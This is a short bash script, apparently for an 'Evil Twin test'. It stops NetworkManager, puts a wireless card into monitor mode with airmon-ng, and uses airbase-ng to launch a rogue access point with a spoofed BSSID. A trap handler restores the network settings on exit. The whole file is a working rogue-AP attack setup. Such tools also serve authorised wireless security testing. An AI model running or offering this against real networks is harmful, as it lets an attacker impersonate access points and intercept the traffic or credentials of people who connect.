#!/bin/bash

cleanup() {
    echo "[*] Restoring network manager and interfaces..."
    service NetworkManager start
    airmon-ng stop wlan1
}

# Trap EXIT (normal exit) and INT (Ctrl+C)
trap cleanup EXIT INT

echo "[*] Starting Evil Twin test..."

# Stop NetworkManager to prevent it from interfering
service NetworkManager stop

# Start monitor mode on wlan1 (this will create mon0)
airmon-ng start wlan1

# Launch rogue AP (this will create at0)
airbase-ng -a 80:37:73:FD:83:D6 -e "malmalmal" -c 6 mon0
